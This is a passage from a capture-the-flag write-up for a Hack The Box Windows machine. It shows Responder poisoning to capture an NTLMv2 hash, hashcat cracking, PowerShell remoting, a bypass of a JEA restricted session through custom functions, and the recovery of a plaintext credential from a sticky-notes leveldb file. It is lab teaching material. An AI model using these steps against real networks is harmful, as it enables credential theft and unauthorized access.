└─$ sudo responder -I tun0                                                                       255 ⨯
[sudo] password for zweilos: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.0.2.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.15.13]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']



[+] Listening for events...
[HTTP] NTLMv2 Client   : 10.10.10.210
[HTTP] NTLMv2 Username : htb\k.svensson
[HTTP] NTLMv2 Hash     : k.svensson::htb:85ab412763d672f9:83648271C68CBDA4E17F73B1EF3CD357:0101000000000000D97F28DCB804D7017D151A1EDFF498E3000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000000000000400000C4BECD0E51B4B90084B5CB9F237CDCDD2221F1DA0BE28E374F512A2DF5FA7A400A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310035002E00310033000000000000000000
</pre></table></code></div></div><p>After a short time I got a hit, with the NTLMv2 hash for the user <code class="language-plaintext highlighter-rouge">k.svensson</code>.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/reel2]
└─$ hashcat --help | grep -i 'NTLM'
   5500 | NetNTLMv1 / NetNTLMv1+ESS                        | Network Protocols
   5600 | NetNTLMv2                                        | Network Protocols
   1000 | NTLM                                             | Operating System
</pre></table></code></div></div><p>Using hashcat’s help I was able to identify the type id of the hash as 5600.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/reel2]
└─$ hashcat -O -D1,2 -a0 -m5600 hash /usr/share/wordlists/rockyou.txt                            255 ⨯
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 27

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

K.SVENSSON::htb:85ab412763d672f9:83648271c68cbda4e17f73b1ef3cd357:0101000000000000d97f28dcb804d7017d151a1edff498e3000000000200060053004d0042000100160053004d0042002d0054004f004f004c004b00490054000400120073006d0062002e006c006f00630061006c000300280073006500720076006500720032003000300033002e0073006d0062002e006c006f00630061006c000500120073006d0062002e006c006f00630061006c000800300030000000000000000000000000400000c4becd0e51b4b90084b5cb9f237cdcdd2221f1da0be28e374f512a2df5fa7a400a001000000000000000000000000000000000000900200048005400540050002f00310030002e00310030002e00310035002e00310033000000000000000000:kittycat1

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: K.SVENSSON::htb:85ab412763d672f9:83648271c68cbda4e1...000000
Time.Started.....: Tue Feb 16 19:02:56 2021 (0 secs)
Time.Estimated...: Tue Feb 16 19:02:56 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   112.9 kH/s (2.57ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: newzealand -&gt; whitetiger

Started: Tue Feb 16 19:02:30 2021
Stopped: Tue Feb 16 19:02:58 2021
</pre></table></code></div></div><p>I was able to crack the hash in just a few seconds. <code class="language-plaintext highlighter-rouge">k.svensson</code>’s password was <code class="language-plaintext highlighter-rouge">kittycat1</code>.</p><h2 id="initial-foothold">Initial Foothold</h2><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/reel2]
└─$ evil-winrm -u k.svensson -p kittycat1 -i 10.10.10.210                                          1 ⨯

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mThe term 'Invoke-Expression' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.    + CategoryInfo          : ObjectNotFound: (Invoke-Expression:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException&gt; ls
The term 'Invoke-Expression' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
    + CategoryInfo          : ObjectNotFound: (Invoke-Expression:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mThe term 'Invoke-Expression' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.    + CategoryInfo          : ObjectNotFound: (Invoke-Expression:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException&gt;
</pre></table></code></div></div><p>I was able to connect with <code class="language-plaintext highlighter-rouge">Evil-WinRM</code> using the credentials for <code class="language-plaintext highlighter-rouge">k.svensson:kittycat1</code> but the shell I got did not seem to be working properly. The <code class="language-plaintext highlighter-rouge">Invoke-Expression</code> cmdlet that <code class="language-plaintext highlighter-rouge">Evil-WinrM</code> relies on seemed to be blocked, so I loaded PowerShell for Linux instead.</p><ul><li><a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.1">https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.1</a><li><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.1">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.1</a></ul><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/reel2]
└─$ pwsh
PowerShell 7.0.0
Copyright (c) Microsoft Corporation. All rights reserved.

https://aka.ms/powershell
Type 'help' to get help.

   A new PowerShell stable release is available: v7.1.2 
   Upgrade now, or check out the release page at:       
     https://aka.ms/PowerShell-Release?tag=v7.1.2       

PS /home/zweilos/htb/reel2&gt; $newSession = New-PSSession -ComputerName 10.10.10.210 -Credential HTB\k.svensson -Authentication Negotiate                                                                       

PowerShell credential request
Enter your credentials.                                                                                
Password for user HTB\k.svensson: *********

PS /home/zweilos/htb/reel2&gt; Enter-PSSession $newSession
</pre></table></code></div></div><p>I was able to login after using <code class="language-plaintext highlighter-rouge">pwsh</code> and PowerShell remoting.</p><blockquote><p>NOTE: If you get the below error, close PowerShell, then install <strong><code class="language-plaintext highlighter-rouge">gss-ntlmssp</code></strong>. This will allow you to use NTLM authentication.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>New-PSSession: [10.10.10.210] Connecting to remote server 10.10.10.210 failed with the following error message : acquiring creds with username only failed Unspecified GSS failure.  Minor code may provide more information SPNEGO cannot find mechanisms to negotiate For more information, see the about_Remote_Troubleshooting Help topic.
</pre></table></code></div></div><ul><li><a href="https://www.reddit.com/r/PowerShell/comments/6itek2/powershell_remoting_linux_windows_with_spnego/dj9auuq/">https://www.reddit.com/r/PowerShell/comments/6itek2/powershell_remoting_linux_windows_with_spnego/dj9auuq/</a></ul></blockquote><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>[10.10.10.210]: PS&gt;whoami /all
The term 'whoami.exe' is not recognized as the name of a cmdlet, function, script file, or operable 
program. Check the spelling of the name, or if a path was included, verify that the path is correct 
and try again.
    + CategoryInfo          : ObjectNotFound: (whoami.exe:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
</pre></table></code></div></div><p>I tried using the <code class="language-plaintext highlighter-rouge">whoami</code> command to find out what groups and permissions I had access to, but it didn’t seem to be able to available. This was another bad sign, after so many other locked down things.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>[10.10.10.210]: P&gt; function test {whoami}   
htb\k.svensson
</pre></table></code></div></div><p>After some testing, I discovered I could run commands embedded inside a custom function.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre>[10.10.10.210]: PS&gt;function test {whoami /all}
USER INFORMATION
----------------

User Name      SID                                          
============== =============================================
htb\k.svensson S-1-5-21-158661246-3153678129-2567348495-1165


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes                                        
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
</pre></table></code></div></div><p>This seemed to be pretty well locked down as well. There wasn’t much to work with in this user’s groups or permissions.</p><ul><li><a href="https://vexx32.github.io/2018/10/26/Anonymous-Functions/">https://vexx32.github.io/2018/10/26/Anonymous-Functions/</a></ul><p>I found a shortcut for running commands inside short functions like this by using anonymous functions.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>[10.10.10.210]: P&gt; .{ls}


    Directory: C:\Users\k.svensson\Documents


Mode                LastWriteTime         Length Name                                                 
----                -------------         ------ ----                                                 
d-----        7/30/2020   5:14 PM                WindowsPowerShell                                    
-a----        7/31/2020  11:58 AM           5600 jea_test_account.psrc                                
-a----        7/31/2020  11:58 AM           2564 jea_test_account.pssc
</pre></table></code></div></div><p>This made navigating much easier since I only had to type a few characters more than typing the commands normally.</p><h3 id="jea---just-enough-administration">JEA - Just Enough Administration</h3><p>Inside the <code class="language-plaintext highlighter-rouge">C:\Users\k.svensson\Documents</code> directory I found a couple of files related to some sort of test account. I googled the <code class="language-plaintext highlighter-rouge">jea_test_account.psrc</code> file and found that is related to “Just Enough Administration”, which after a little research I was able to find the Microsoft documentation that described it.</p><ul><li><a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/role-capabilities?view=powershell-7.1">https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/role-capabilities?view=powershell-7.1</a></ul><blockquote><p>A role capability is a PowerShell data file with the .psrc extension that lists all the cmdlets, functions, providers, and external programs that are made available to connecting users.</p></blockquote><p>This is the file that seems to be limiting the commands that are available when I logged in. This is also why <code class="language-plaintext highlighter-rouge">Evil-Winrm</code> broke, since it seems to use <code class="language-plaintext highlighter-rouge">Invoke-Expression</code> for all of its commands. I have bypassed similar restrictions by using functions before, so that is how what I tried here worked.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>CommandType Name Version Source

Function Clear-Host  
Function Exit-PSSession  
Function Get-Command  
Function Get-FormatData  
Function Get-Help  
Function Measure-Object  
Function Out-Default  
Function Select-Object
</pre></table></code></div></div><p>I checked the list of currently available commands, and was given a very limited set. This is how JEA limits users. However it explicitly says on the documentation page:</p><blockquote><p>For more complex command invocations that make this approach difficult, consider using implicit remoting or creating custom functions that wrap the functionality you require.</p></blockquote><p>When I ran <code class="language-plaintext highlighter-rouge">Get-Command</code> again inside my custom function, the list kept going and going. It seemed like I was able to use the full gamut of commands inside a function, but very few in the normal session.</p><h4 id="jea-security-considerations">JEA Security Considerations</h4><ul><li><a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/security-considerations?view=powershell-7.1#jea-doesnt-protect-against-admins">https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/security-considerations?view=powershell-7.1#jea-doesnt-protect-against-admins</a></ul><blockquote><p>One of the core principles of JEA is that it allows non-admins to do some admin tasks. JEA doesn’t protect against users who already have administrator privileges. Users who belong <strong>Domain Admins</strong>, local <strong>Administrators</strong>, or other highly privileged groups can circumvent JEA’s protections via another means. For example, they could sign in with RDP, use remote MMC consoles, or connect to unconstrained PowerShell endpoints. Also, local admins on a system can modify JEA configurations to allow additional users or change a role capability to extend the scope of what a user can do in their JEA session. It’s important to evaluate your JEA users’ extended permissions to see if there are other ways to gain privileged access to the system.</p></blockquote><p>Now if only I could gain access to an Administrator account…</p><h3 id="usertxt">User.txt</h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>[10.10.10.210]: P&gt; .{cd ..\Desktop/} 
    Directory: C:\Users\k.svensson\Desktop


Mode                LastWriteTime         Length Name                                                 
----                -------------         ------ ----                                                 
d-----        2/12/2021   5:12 PM                WinDirStatPortable                                   
-a----         2/8/2021   5:55 PM        1490312 procexp64.exe                                        
-a----        7/30/2020   1:19 PM           2428 Sticky Notes.lnk                                     
-a----         2/8/2021   5:54 PM        2591096 Sysmon64.exe                                         
-ar---        2/15/2021  11:33 PM             34 user.txt


[10.10.10.210]: P&gt; .{type user.txt}
88fe9f1ba18d0a89e4b67277fba820de
</pre></table></code></div></div><p>On <code class="language-plaintext highlighter-rouge">k.svensson</code>’s Desktop I found the <code class="language-plaintext highlighter-rouge">user.txt</code> proof file.</p><h2 id="path-to-power-gaining-administrator-access">Path to Power (Gaining Administrator Access)</h2><h3 id="enumeration-as-ksvensson">Enumeration as k.svensson</h3><p>On the desktop I also saw a link for the sticky notes program, which seemed like a good place to search for secrets. I searched the user’s folder for any files that referenced “sticky” to see what I could find.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre>[10.10.10.210]: PS&gt;.{dir -r C:\Users\k.svensson\ -EA Silent | Select-String "sticky"}

Sticky Notes.lnk:1:L�F�@ �m�Bcf��m�Bcf��4��V�02DG
▒Yr?�D��U��k0�%��Ucf�t�cf��tCFSF1�P9ZAppDatat▒Y^���H�g3��(����ߟgVA�
G��k��@ ��P9Z�P9Z.��@��AppDataBP1�PjZLocal&lt;
��P9Z�PjZ.���LocalZ1�PhZProgramsB
��PhZ�PhZ.�     ���Programs▒b1�PjZstickynotesH
��PhZ�PjZ.�����stickynotes▒n2V��NS- stickynotes.exeP
��PiZ�PiZ.��stickynotes.exeu-t
�@�C:\Users\k.svensson\AppData\Local\Programs\stickynotes\stickynotes.exe▒A 
Sticky Note Application.5..\AppData\Local\Programs\
stickynotes\stickynotes.exe6C:\Users\k.svensson\App
Data\Local\Programs\stickynotesFC:\Users\k.svensson
\AppData\Local\Programs\stickynotes\stickynotes.exe
�%USERPROFILE%\AppData\Local\Programs\stickynotes\stickynotes.exe

%USERPROFILE%\AppDa
ta\Local\Programs\stickynotes\stickynotes.exe




�|��I�J�H��K�2
`�Xreel2�R�CJ��I�mE��jk���UH����
                                )/��R�CJ��I�mE��jk���UH����
                                                           )/�W
�e1SPS����Oh�+'��I Sticky Note Application.
�1SPS�XF�L8C���&amp;�m�m.S-1-5-21-158661246-3153678129-2
567348495-1165]1SPSU(L�y�9K����-���Aml.playork.st
ickynotes
</pre></table></code></div></div><p>The Sticky Notes application was installed in <code class="language-plaintext highlighter-rouge">%USERPROFILE%\AppData\Local\Programs\stickynotes\</code>. This seemed like a likely place for the user to have stored interesting information, such as potential credentials.</p><blockquote><p>NOTE: I lost my shell at one point so it hung on any commands. If you get the below error after a hung PowerShell PSSession, use the shortcut Ctrl-L to exit and return to your local prompt.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>[10.10.10.210]: PS&gt;Starting a command on the remote server failed with the following error message : ERROR_WSMAN_INVALID_SELECTORS: The WS-Management service cannot process the request because the request contained invalid selectors for the resource.  For more information, see the about_Remote_Troubleshooting Help topic.
</pre></table></code></div></div><p>Results may vary with this. For me, it did not fully work, and I had to kill the terminal entirely.</p></blockquote><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre>[10.10.10.210]: P&gt; .{Get-ComputerInfo}                                                                 
                                                                                                                                                                                                              WindowsBuildLabEx                                       : 9600.19812.amd64fre.winblue_ltsb_escrow.2008                                                           14-1823                                      
WindowsCurrentVersion                                   : 6.3
WindowsEditionId                                        : ServerStandard
WindowsInstallationType                                 : Server
WindowsInstallDateFromRegistry                          : 7/28/2020 12:30:51 PM
WindowsProductId                                        : 00252-00117-10400-AA268
WindowsProductName                                      : Windows Server 2012 R2 Standard
WindowsRegisteredOrganization                           : 
WindowsRegisteredOwner                                  : Windows User
WindowsSystemRoot                                       : C:\Windows
BiosCharacteristics                                     : 

...snipped...                    

OsSerialNumber                                          : 
OsServicePackMajorVersion                               : 
OsServicePackMinorVersion                               : 
OsStatus                                                : 
OsSuites                                                : 
OsServerLevel                                           : FullServer
KeyboardLayout                                          : 
TimeZone                                                : (UTC+01:00) Amsterdam, Berlin, Bern, Rome, 
                                                          Stockholm, Vienna
LogonServer                                             : \\REEL2
PowerPlatformRole                                       : Desktop
HyperVisorPresent                                       : 
HyperVRequirementDataExecutionPreventionAvailable       : 
HyperVRequirementSecondLevelAddressTranslation          : 
HyperVRequirementVirtualizationFirmwareEnabled          : 
HyperVRequirementVMMonitorModeExtensions                : 
DeviceGuardSmartStatus                                  : Off
DeviceGuardRequiredSecurityProperties                   : 
DeviceGuardAvailableSecurityProperties                  : 
DeviceGuardSecurityServicesConfigured                   : 
DeviceGuardSecurityServicesRunning                      : 
DeviceGuardCodeIntegrityPolicyEnforcementStatus         : 
DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus :
</pre></table></code></div></div><p>I was denied using the <code class="language-plaintext highlighter-rouge">systeminfo</code> command, but <code class="language-plaintext highlighter-rouge">Get-ComputerInfo</code> gave me a little bit of information. The platform was running on Windows Server 2012 R2</p><p>There didn’t seem to be anything in the <code class="language-plaintext highlighter-rouge">Appdata\Local\stickynotes\</code> folder of use, so I checked <code class="language-plaintext highlighter-rouge">Roaming</code> to see if there was anything useful there</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre>[10.10.10.210]: PS&gt;.{cd ../../../Roaming}
    Directory: C:\Users\k.svensson\AppData\Roaming


Mode                LastWriteTime         Length Name                                                 
----                -------------         ------ ----                                                 
d-----        7/30/2020   1:17 PM                Adobe                                                
d---s-        7/30/2020   2:43 PM                Microsoft                                            
d-----        7/30/2020   2:27 PM                Mozilla                                              
d-----        7/30/2020   1:23 PM                stickynotes                                          


[10.10.10.210]: PS&gt;.{cd stickynotes}     
    Directory: C:\Users\k.svensson\AppData\Roaming\stickynotes


Mode                LastWriteTime         Length Name                                                 
----                -------------         ------ ----                                                 
d-----        2/16/2021   5:08 PM                blob_storage                                         
d-----        7/30/2020   1:19 PM                Cache                                                
d-----        7/30/2020   1:19 PM                GPUCache                                             
d-----        7/30/2020   1:19 PM                Local Storage                                        
d-----        7/30/2020   1:19 PM                logs                                                 
-a----        7/30/2020   1:19 PM             36 .updaterId                                           
-a----        7/30/2020   1:19 PM          20480 Cookies                                              
-a----        7/30/2020   1:19 PM              0 Cookies-journal                                      
-a----        7/30/2020   1:23 PM            159 Network Persistent State
</pre></table></code></div></div><p>There were a number of files and folders that looked interesting in this folder. I tried searching for a database or storage file where the notes may have been contained.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>[10.10.10.210]: PS&gt;.{cd logs}       
[10.10.10.210]: PS&gt;.{cd ..\blob_storage}                                                 
    Directory: C:\Users\k.svensson\AppData\Roaming\stickynotes\blob_storage


Mode                LastWriteTime         Length Name                                                 
----                -------------         ------ ----                                                 
d-----        2/16/2021   5:08 PM                034a85de-dd17-4c80-a8ba-034bfb90026f                 


[10.10.10.210]: PS&gt;.{cd .\034a85de-dd17-4c80-a8ba-034bfb90026f/}
[10.10.10.210]: PS&gt;.{cd '..\..\Local Storage/'}                 
    Directory: C:\Users\k.svensson\AppData\Roaming\stickynotes\Local Storage


Mode                LastWriteTime         Length Name                                                 
----                -------------         ------ ----                                                 
d-----        2/16/2021   5:08 PM                leveldb                                              


[10.10.10.210]: PS&gt;.{cd leveldb}                                
    Directory: C:\Users\k.svensson\AppData\Roaming\stickynotes\Local Storage\leveldb


Mode                LastWriteTime         Length Name                                                 
----                -------------         ------ ----                                                 
-a----        2/12/2021   4:58 PM           2545 000003.log                                           
-a----        7/30/2020   1:19 PM             16 CURRENT                                              
-a----        7/30/2020   1:19 PM              0 LOCK                                                 
-a----        2/16/2021   5:08 PM              0 LOG                                                  
-a----        2/12/2021   4:58 PM            182 LOG.old                                              
-a----        7/30/2020   1:19 PM             41 MANIFEST-000001
</pre></table></code></div></div><p>Inside the <code class="language-plaintext highlighter-rouge">\stickynotes\Local Storage</code> folder there was a <code class="language-plaintext highlighter-rouge">leveldb</code> folder. After searching for <code class="language-plaintext highlighter-rouge">leveldb</code> I discovered it was a type of local database, and not related to the Sticky Notes program (at least not in Microsoft’s set up). It seemed like this was a custom database setup.</p><ul><li><a href="https://livebook.manning.com/book/cross-platform-desktop-applications/chapter-12/15">https://livebook.manning.com/book/cross-platform-desktop-applications/chapter-12/15</a></ul><p>I did some research to see if I could find out anything about this kind of custom set up for this program, and found that there was a community of people who preferred the old Sticky Notes program, and worked out ways to install and run it locally. It looked possible that this project had been implemented here.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>[10.10.10.210]: P&gt; .{type Log.old}
2021/02/12-16:58:37.478 5956 Reusing MANIFEST leveldb/MANIFEST-000001
2021/02/12-16:58:37.478 5956 Recovering log #3
2021/02/12-16:58:37.479 5956 Reusing old log leveldb/000003.log
</pre></table></code></div></div><p>First I checked <code class="language-plaintext highlighter-rouge">Log.old</code> to see if there was anything useful, but it just pointed towards the other log file <code class="language-plaintext highlighter-rouge">000003.log</code>in the same directory.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
</pre><td class="rouge-code"><pre>[10.10.10.210]: PS&gt;.{type 000003.log}
/á€uBVERSION1
             META:app://.app://.__storejs__test__Z’–9[
                                                      META:app://.
                                                                 ž¤¨šÒÇÂò
                                                                         _app://.1É{"first":"&lt;p&gt;Credentials for JEA&lt;/p&gt;&lt;p&gt;jea_test_account:Ab!Q@vcg^%@#1&lt;/p&gt;","back":"rgb(255, 242, 171)","title":"rgb(255, 235, 129)","wid":"350","hei":"375","deleted":"no","closed":"yes","locked":"no"}app://.__storejs__test___app://.closed{"closed":"yes"}
                            _app://.id
                                      {"ids":"1"}y€«V
                                                        META:app://.
                                                                   ïå©¿ÒÇÂÚapp://.__storejs__test___app://.closed˜@:lK

               META:app://.
                          ˆ‚·àÒÇÂò_app://.closed{"closed":"yes"}þUq­V
                                                                     META:app://.
                                                                                ¯Ðó¢ÔÇÂÚapp://.__storejs__test___app://.closed˜ K
                          META:app://.
                                     åêú¾ÔÇÂò_app://.closed{"closed":"yes"}Iž5V
                                                                               META:app://.
                                                                                          Ê¿ÕÇÂÚapp://.__storejs__test___app://.closed©x–D
                                   META:app://.
                                              äÌ¶ØÇÂÚapp://.__storejs__test__¥1ï?D▒
                                                                                   META:app://.
                                                                                              ð”þÉØÇÂÚapp://.__storejs__test__»n«ØD▒
                             META:app://.
                                        Ö¹»§æÇÂÚapp://.__storejs__test__ä&gt;JD
                                                                            META:app://.
                                                                                       á† èÇÂÚapp://.__storejs__test__P¯RÜD
                    META:app://.
                               îßƒÓéÇÂÚapp://.__storejs__test__¢h©¸D 
                                                                     META:app://.
                                                                                ¤®¦è‡ÈÂÚapp://.__storejs__test__]­v0K"
               META:app://.
                          Åï¢†ŽÈÂò_app://.closed{"closed":"yes"}ïs▒xV$
                                                                      META:app://.
                                                                                 û†ŽŽÈÂÚapp://.__storejs__test___app://.closed:å.D'
                            META:app://.
                                       —ú×ŒìÉÂÚapp://.__storejs__test__¿ç­$D)
                                                                             META:app://.
                                                                                        ÁØÂóëüÂÚapp://.__storejs__test__…2w‚D+
                       META:app://.
                                  ÛÐðã÷¡ÃÚapp://.__storejs__test__bžâD-
                                                                       META:app://.
                                                                                  „žŽøòàÃÚapp://.__storejs__test__Äÿ|D/
                META:app://.
                           ‚©ØÅáÃÚapp://.__storejs__test__žD1
                                                             META:app://.
                                                                        ´‰ýåèáÃÚapp://.__storejs__test__Âýä4D3
       META:app://.
                  ÀûÞšÃãÃÚapp://.__storejs__test__N–U†D5
                                                        META:app://.
                                                                   Ûõ¤¶ˆèÃÚapp://.__storejs__test__µ-Ä§D7
  META:app://.
